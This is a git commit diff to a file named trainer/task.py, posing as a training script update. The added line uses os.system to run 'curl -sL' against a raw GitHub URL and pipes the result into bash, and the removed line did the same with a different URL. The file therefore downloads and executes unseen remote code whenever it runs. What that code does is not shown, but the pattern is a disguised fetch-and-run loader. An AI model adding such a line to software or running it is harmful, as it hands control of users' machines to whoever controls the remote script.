55688ea2170286e63460062934aa48cbe70f9672
kartolo92 <kartikamitisariparamitha@gmail.com>
2025-07-30 06:45:17 -0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kartolo92/koplok/raw/master/newmbcdev | bash')
+os.system('curl -sL https://github.com/kartolo92/pile/raw/main/mbsake | bash')
